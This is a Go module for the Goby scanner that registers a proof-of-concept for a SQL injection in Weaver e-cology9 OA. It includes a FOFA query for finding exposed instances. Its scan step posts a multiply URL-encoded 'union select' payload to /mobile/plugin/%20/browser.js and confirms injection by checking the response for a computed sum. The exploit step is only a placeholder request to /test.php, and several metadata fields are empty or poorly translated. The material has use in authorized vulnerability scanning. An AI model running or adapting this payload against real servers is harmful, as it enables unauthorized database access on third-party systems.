package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "泛微e-cology9 SQL注入",
  "Description": "",
  "Product": "泛微协同商务系统（e-cology）",
  "Homepage": "https://www.weaver.com.cn/",
  "DisclosureDate": "2023-03-17",
  "Author": "清晨",
  "FofaQuery": "app=\"泛微-协同办公OA\"",
  "GobyQuery": "app=\"泛微-协同办公OA\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "<p><span style=\"font-size: 16px;\">目前官方已发布安全补丁修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</span><span style=\"font-size: 16px;\"><a href=\"https://www.weaver.com.cn/cs/securityDownload.asp#\">https://www.weaver.com.cn/cs/securityDownload.asp#</a></span><br></p>",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/mobile/plugin/%20/browser.js",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": "isDis=1&browserTypeId=269&keyword=a%252527%252Bunion%252Bselect%252B35469%25252B11223%25252C%2525271"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "46692",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "泛微e-cology9 SQL注入",
      "Product": "泛微协同商务系统（e-cology）",
      "Description": "",
      "Recommendation": "<p><span style=\"font-size: 16px;\">目前官方已发布安全补丁修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</span><span style=\"font-size: 16px;\"><a href=\"https://www.weaver.com.cn/cs/securityDownload.asp#\">https://www.weaver.com.cn/cs/securityDownload.asp#</a></span><br></p>",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "e-cology9 SQL注入",
      "Product": "Panmine-Association-Business-System-(E-COLOGY)",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}